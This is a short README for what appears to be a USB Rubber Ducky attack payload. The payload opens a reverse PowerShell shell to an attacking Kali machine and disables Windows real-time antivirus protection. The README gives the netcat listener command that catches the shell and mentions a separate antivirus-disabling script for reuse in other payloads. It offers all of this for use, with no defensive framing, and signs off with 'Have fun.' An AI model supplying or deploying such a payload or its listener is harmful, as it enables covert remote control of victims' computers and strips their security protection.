use the script for inject. bin 
then.
Open terminal on attacking Kali machine and enter

stty raw -echo; (stty size; cat) | nc -lvnp (port number)

This code is based on a video by Networkchuck. I just made the Ducky script.
Now updated to turn off windows realtime anti virus protection.

Reverse powershell ducky already has the No AV code but I have made No_AV_Ducky code
for those who want to use it with their own scripts.

Have fun.
